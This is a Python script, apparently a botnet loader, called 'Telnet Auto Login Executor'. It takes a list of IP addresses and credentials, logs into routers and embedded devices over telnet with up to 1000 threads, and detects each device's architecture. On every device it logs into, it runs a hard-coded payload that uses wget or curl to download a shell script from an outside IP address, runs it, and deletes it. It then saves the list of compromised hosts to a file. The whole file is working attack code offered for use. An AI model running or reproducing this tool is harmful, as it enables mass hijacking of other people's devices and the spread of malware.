#!/usr/bin/env python3

import socket
import concurrent.futures
import time
import sys
import re
import os
import signal
import threading
import queue
import random
from datetime import datetime
from collections import defaultdict

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

USE_COLORS = hasattr(sys.stdout, 'isatty') and sys.stdout.isatty()

LOGIN_PROMPTS = [
    b'login:', b'username:', b'user:', b'account:', b'Login:', b'Username:',
    b'User:', b'LOGIN:', b'USERNAME:', b'USER:', b'login :', b'username :',
    b'user :', b'login>', b'username>', b'user>', b'Enter username:',
    b'Please login:', b'Authentication required', b'Name:', b'ID:',
    b'id:', b'Login ID:', b'User ID:', b'access:', b'auth:', b'Auth:',
    b'enter username:', b'Enter User Name:', b'Username:', b'account:',
    b'Account:', b'login: /', b'username: /', b'cisco username:',
    b'User Access Verification', b'Password required', b'Login authentication',
    b'Username: ', b'User: ', b'Login: ', b'Name: ',
    b'\nlogin: ', b'\nusername: ', b'\nuser: ', b'\naccount: ',
    b'Please enter username:', b'Enter your username:', b'Auth Username:',
    b'CLI Username:', b'Console Login:', b'System Login:',
    b'zlm60 login:', b'PBOC login:', b'ZLM login:', b'ZTE login:',
    b'Huawei login:', b'cisco login:', b'Router login:', b'Switch login:',
    b'Device login:', b'Sysadmin login:', b'Admin login:', b'root login:',
    b'user login:', b'console login:', b'serial login:', b'login:',
    b'Username:', b'Password:', b'User Name:', b'Account:',
]

PASSWORD_PROMPTS = [
    b'password:', b'Password:', b'PASSWORD:', b'pass:', b'Pass:',
    b'password :', b'Password :', b'PASS:', b'enter password:',
    b'Enter Password:', b'Please enter password:', b'passwd:',
    b'Passwd:', b'password>', b'Password>', b'secret:', b'Secret:',
    b'PWD:', b'pwd:', b'Password: ', b'pass: ', b'secret: ',
    b'Enter Password:', b'Enter password:', b'Input password:',
    b'Please input password:', b'Auth Password:', b'System Password:',
    b'Password:', b'password:', b'Pass:', b'pass:',
    b'Enter secret:', b'Cisco password:', b'Access Password:',
]

SHELL_PROMPTS = [
    b'$', b'#', b'>', b'%', b']$', b']#', b':~$', b':~#', b'/#', b'/ $',
    b'# ', b'$ ', b'> ', b'% ', b'~ $', b'~ #', b'bash$', b'bash#',
    b'sh$', b'sh#', b'root@', b'user@', b'@localhost', b'busybox$',
    b'busybox#', b'/>', b'\\>', b'command>', b'shell>', b'cli>',
    b']\\$', b']\\#', b'}:~$', b'}:~#', b'# ', b'\\$ ', b'\\# ',
    b'/> ', b'\\> ', b'~\\$', b'~\\#', b'\\$\\$', b'#\\$',
    b'~ $', b'~ #', b'/# ', b'/ #', b'$ ', b'# ', b'> ', b'% ',
    b'root:', b'user:', b'admin:', b'guest:', b']#', b']$',
]

BANNER_PROMPTS = [
    b'Welcome to', b'Linux', b'QTerm', b'PBOC', b'ZLM', b'ZTE', b'Huawei',
    b'Cisco', b'Router', b'Switch', b'Device', b'Gateway', b'ONT', b'ONU',
    b'FiberHome', b'Zyxel', b'D-Link', b'TP-Link', b'Netgear', b'Asus',
    b'MikroTik', b'Ubiquiti', b'OpenWrt', b'DD-WRT', b'Tomato', b'BusyBox',
    b'Kernel', b'QTerm v', b'ZLM60', b'PBOC Terminal', b'Linux for MIPS',
    b'Linux for ARM', b'Linux for x86', b'Embedded Linux', b'UBNT',
    b'EdgeOS', b'AirOS', b'RouterOS', b'VyOS', b'pfSense', b'OPNsense',
]

VENDOR_PROMPTS = {
    'ZTE_ZLM': [b'ZLM60', b'zlm60', b'ZTE ZLM', b'ZTE Linux', b'ZTE Router', b'ZXHN>', b'F660>'],
    'ZTE': [b'ZTE>', b'ZTE#', b'ZXHN>', b'ZXHN#', b'F660>', b'F660#', b'ZXV10>', b'ZXA10>'],
    'Huawei': [b'Huawei>', b'Huawei#', b'HG8245>', b'EchoLife>', b'MA5600>', b'SmartAX>', b'Quidway>'],
    'MikroTik': [b'MikroTik>', b'MikroTik#', b'[admin@MikroTik]', b'RouterOS', b'MT>'],
    'Cisco': [b'cisco>', b'cisco#', b'Router>', b'Router#', b'Switch>', b'Switch#', b'ios>', b'ios#'],
    'PBOC_Terminal': [b'PBOC', b'QTerm', b'PBOC login', b'PBOC Terminal', b'QTerm v'],
    'FiberHome': [b'FiberHome>', b'FiberHome#', b'AN5506>', b'AN5506#', b'HG>'],
    'Zyxel': [b'ZyXEL>', b'ZyXEL#', b'ras>', b'ras#', b'ZySH>', b'P-660>'],
    'D-Link': [b'D-Link>', b'D-Link#', b'Dlink>', b'Dlink#', b'DSL>', b'DIR>'],
    'TP-Link': [b'TP-Link>', b'TP-Link#', b'Tplink>', b'Tplink#', b'TL>', b' Archer>'],
    'Netgear': [b'NETGEAR>', b'NETGEAR#', b'Netgear>', b'Netgear#', b'NG>'],
    'Asus': [b'ASUS>', b'ASUS#', b'Asus>', b'Asus#', b'RT>', b'Asuswrt>', b'Merlin>'],
    'Ubiquiti': [b'UBNT>', b'UBNT#', b'AirOS>', b'EdgeOS>', b'ubnt>', b'UniFi>'],
    'OpenWrt': [b'OpenWrt>', b'OpenWrt#', b'root@OpenWrt', b'BusyBox', b'LEDE>'],
    'DD_WRT': [b'DD-WRT>', b'DD-WRT#', b'dd-wrt>', b'dd-wrt#', b'DD-WRT v'],
    'VyOS': [b'vyos@', b'vyos>', b'vyos#', b'VyOS', b'vyatta'],
    'pfSense': [b'pfSense>', b'pfSense#', b'pfSense', b'pfsense'],
    'OPNsense': [b'OPNsense>', b'OPNsense#', b'opnsense'],
    'Juniper': [b'junos>', b'junos#', b'root@%', b'JUNOS', b'Juniper>'],
    'Fortinet': [b'FortiGate>', b'FortiGate#', b'FGT>', b'FGT#', b'fortinet'],
}

PAYLOAD = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://62.171.142.33/payload.sh -O p.sh 2>/dev/null || busybox wget -q http://62.171.142.33/payload.sh -O p.sh 2>/dev/null || curl -s http://62.171.142.33/payload.sh -o p.sh; chmod +x p.sh; sh p.sh; rm -rf p.sh"

def log_success(msg):
    if USE_COLORS:
        print(f"{Colors.GREEN}{Colors.BOLD}[+]{Colors.RESET} {Colors.GREEN}{msg}{Colors.RESET}")
    else:
        print(f"[+] {msg}")
    sys.stdout.flush()

def log_failed(msg):
    if USE_COLORS:
        print(f"{Colors.RED}{Colors.BOLD}[-]{Colors.RESET} {Colors.RED}{msg}{Colors.RESET}")
    else:
        print(f"[-] {msg}")
    sys.stdout.flush()

def log_info(msg):
    if USE_COLORS:
        print(f"{Colors.CYAN}[*]{Colors.RESET} {Colors.WHITE}{msg}{Colors.RESET}")
    else:
        print(f"[*] {msg}")
    sys.stdout.flush()

def log_warning(msg):
    if USE_COLORS:
        print(f"{Colors.YELLOW}[!]{Colors.RESET} {Colors.YELLOW}{msg}{Colors.RESET}")
    else:
        print(f"[!] {msg}")
    sys.stdout.flush()

def parse_targets(filename):
    targets = []
    invalid = 0
    duplicates = set()
    
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                
                if not line or line.startswith('#'):
                    continue
                
                parts = line.split()
                if len(parts) < 2:
                    invalid += 1
                    continue
                
                ip_port = parts[0]
                user_pass = parts[1]
                
                if ':' not in ip_port:
                    invalid += 1
                    continue
                
                ip, port_str = ip_port.split(':', 1)
                try:
                    port = int(port_str)
                    if port < 1 or port > 65535:
                        port = 23
                except:
                    port = 23
                
                if ':' not in user_pass:
                    username = user_pass
                    password = ""
                else:
                    username, password = user_pass.split(':', 1)
                
                arch = parts[2] if len(parts) > 2 else "unknown"
                
                key = f"{ip}:{port}"
                if key not in duplicates:
                    duplicates.add(key)
                    targets.append({
                        'ip': ip,
                        'port': port,
                        'username': username,
                        'password': password,
                        'arch': arch,
                        'raw': line
                    })
        
        log_info(f"Loaded {len(targets)} targets from {filename}")
        if invalid > 0:
            log_warning(f"Skipped {invalid} invalid lines")
        
        return targets
        
    except FileNotFoundError:
        log_failed(f"File {filename} not found!")
        return []
    except Exception as e:
        log_failed(f"Error reading file: {e}")
        return []

def telnet_connect(ip, port, username, password, timeout=7):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        
        sock.settimeout(3)
        banner_data = b''
        try:
            banner_data = sock.recv(8192)
        except:
            pass
        
        sock.settimeout(3)
        
        login_sent = False
        for prompt in LOGIN_PROMPTS:
            if prompt.lower() in banner_data.lower():
                sock.send(username.encode() + b'\n')
                login_sent = True
                break
        
        if not login_sent:
            sock.send(username.encode() + b'\n')
        
        time.sleep(0.5)
        password_data = b''
        try:
            password_data = sock.recv(4096)
        except:
            pass
        
        pass_sent = False
        for prompt in PASSWORD_PROMPTS:
            if prompt.lower() in password_data.lower():
                sock.send(password.encode() + b'\n')
                pass_sent = True
                break
        
        if not pass_sent:
            sock.send(password.encode() + b'\n')
        
        time.sleep(1)
        shell_data = b''
        
        for _ in range(5):
            try:
                sock.send(b'\n')
                time.sleep(0.3)
                shell_data += sock.recv(8192)
            except:
                pass
        
        for prompt in SHELL_PROMPTS:
            if prompt.lower() in shell_data.lower():
                return True, sock
        
        sock.close()
        return False, None
        
    except socket.timeout:
        if sock:
            sock.close()
        return False, None
    except ConnectionRefusedError:
        if sock:
            sock.close()
        return False, None
    except Exception:
        if sock:
            sock.close()
        return False, None

def get_architecture(sock):
    arch_commands = ['uname -m', 'uname -a', 'cat /proc/version', 'arch', 'echo $MACHTYPE']
    
    for cmd in arch_commands:
        try:
            sock.send(cmd.encode() + b'\n')
            time.sleep(0.5)
            data = sock.recv(4096).decode('ascii', errors='ignore').lower()
            
            if 'aarch64' in data or 'arm64' in data:
                return 'aarch64'
            elif 'armv7' in data or 'arm7' in data:
                return 'armv7'
            elif 'armv6' in data or 'arm6' in data:
                return 'armv6'
            elif 'armv5' in data or 'arm5' in data:
                return 'armv5'
            elif 'arm' in data:
                return 'arm'
            elif 'mips64' in data:
                return 'mips64'
            elif 'mips' in data and 'mipsel' not in data:
                return 'mips'
            elif 'mipsel' in data:
                return 'mipsel'
            elif 'x86_64' in data or 'amd64' in data:
                return 'x86_64'
            elif 'i686' in data or 'i586' in data or 'i386' in data:
                return 'x86'
            elif 'sh4' in data:
                return 'sh4'
            elif 'ppc64' in data:
                return 'ppc64'
            elif 'ppc' in data:
                return 'ppc'
            elif 'riscv64' in data:
                return 'riscv64'
        except:
            continue
    
    return 'unknown'

def execute_payload(sock, arch):
    try:
        sock.send(b'\n')
        time.sleep(0.3)
        sock.send(PAYLOAD.encode() + b'\n')
        time.sleep(3)
        return True
    except:
        return False

def process_target(target, results_queue, stats):
    ip = target['ip']
    port = target['port']
    username = target['username']
    password = target['password']
    arch = target['arch']
    
    try:
        success, sock = telnet_connect(ip, port, username, password)
        
        if success:
            detected_arch = get_architecture(sock)
            payload_ok = execute_payload(sock, detected_arch)
            
            result = {
                'ip': ip,
                'port': port,
                'username': username,
                'password': password,
                'arch': detected_arch,
                'payload': payload_ok,
                'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            results_queue.put(result)
            stats['success'] += 1
            
            payload_status = " [✓]" if payload_ok else " [✗]"
            log_success(f"{ip}:{port} | {detected_arch} | {username}:{password}{payload_status}")
            
            try:
                sock.close()
            except:
                pass
        else:
            stats['failed'] += 1
            log_failed(f"{ip}:{port} | {username}:{password}")
            
    except Exception as e:
        stats['failed'] += 1
        log_failed(f"{ip}:{port} | Error: {str(e)[:30]}")
        stats['errors'] += 1

def save_results(results, filename="hasil_sukses.txt"):
    try:
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("# Telnet Auto Login Results\n")
            f.write(f"# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"# Total Success: {len(results)}\n")
            f.write("#" + "="*80 + "\n\n")
            f.write("# Format: IP:PORT ARCH USERNAME:PASSWORD PAYLOAD_STATUS\n\n")
            
            for r in results:
                payload_status = "PAYLOAD_OK" if r.get('payload', False) else "PAYLOAD_FAILED"
                f.write(f"{r['ip']}:{r['port']} {r['arch']} {r['username']}:{r['password']} {payload_status}\n")
        
        log_info(f"Saved {len(results)} results to {filename}")
        
        with open("hasil_sukses_simple.txt", 'w', encoding='utf-8') as f:
            for r in results:
                f.write(f"{r['ip']}:{r['port']}\n")
        
        return True
    except Exception as e:
        log_warning(f"Failed to save results: {e}")
        return False

def print_banner():
    banner = f"""
{Colors.MAGENTA}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════════╗
║                    TELNET AUTO LOGIN EXECUTOR - ULTIMATE EDITION                 ║
║                                                                                  ║
║  Features:                                                                       ║
║  - Support 100+ login prompt patterns                                            ║
║  - Support ZLM60, PBOC, QTerm, Cisco, Huawei, ZTE, MikroTik, etc               ║
║  - Auto architecture detection (uname -m)                                       ║
║  - Multi-threaded (up to 1000 concurrent)                                       ║
║  - Automatic payload execution                                                  ║
║  - No external dependencies                                                     ║
║                                                                                  ║
╚══════════════════════════════════════════════════════════════════════════════════╝
{Colors.RESET}
"""
    print(banner)

def main():
    print_banner()
    
    if len(sys.argv) > 1:
        filename = sys.argv[1]
    elif os.path.exists("all.txt"):
        filename = "all.txt"
    else:
        log_failed("No input file found!")
        log_info("Usage: python3 telnet.py all.txt")
        log_info("Format all.txt: IP:PORT USERNAME:PASSWORD")
        log_info("Example: 192.168.1.1:23 root:admin")
        return
    
    targets = parse_targets(filename)
    if not targets:
        log_failed("No valid targets loaded!")
        return
    
    max_workers = min(1000, len(targets))
    log_info(f"Total targets: {len(targets)}")
    log_info(f"Thread pool: {max_workers}")
    log_info("Starting attack...\n")
    
    results_queue = queue.Queue()
    stats = {'success': 0, 'failed': 0, 'errors': 0}
    results = []
    
    start_time = time.time()
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for target in targets:
            future = executor.submit(process_target, target, results_queue, stats)
            futures.append(future)
        
        completed = 0
        while completed < len(futures):
            try:
                result = results_queue.get(timeout=1)
                if result:
                    results.append(result)
                completed += 1
                
                if completed % 100 == 0 or completed == len(futures):
                    elapsed = time.time() - start_time
                    rate = completed / elapsed if elapsed > 0 else 0
                    eta = (len(targets) - completed) / rate if rate > 0 else 0
                    
                    progress = (completed / len(targets)) * 100
                    bar_len = 40
                    filled = int(bar_len * completed // len(targets))
                    bar = '█' * filled + '░' * (bar_len - filled)
                    
                    log_info(f"[{bar}] {progress:.1f}% | {completed}/{len(targets)} | "
                            f"Rate: {rate:.1f}/s | ETA: {eta:.0f}s | Success: {len(results)}")
                    
            except queue.Empty:
                continue
    
    elapsed = time.time() - start_time
    
    print("\n" + "="*80)
    log_info("SCAN COMPLETE")
    log_info(f"Total targets: {len(targets)}")
    log_info(f"Successful: {len(results)}")
    log_info(f"Failed: {len(targets) - len(results)}")
    log_info(f"Success rate: {(len(results)/len(targets)*100):.2f}%")
    log_info(f"Time: {elapsed:.1f}s | Speed: {len(targets)/elapsed:.1f} targets/s")
    print("="*80)
    
    if results:
        save_results(results)
        payload_ok = sum(1 for r in results if r.get('payload', False))
        log_success(f"Payload executed on {payload_ok} devices")
    else:
        log_warning("No successful logins found")
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}DONE! Results saved to hasil_sukses.txt{Colors.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n")
        log_warning("Interrupted by user")
        sys.exit(130)
    except Exception as e:
        log_failed(f"Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
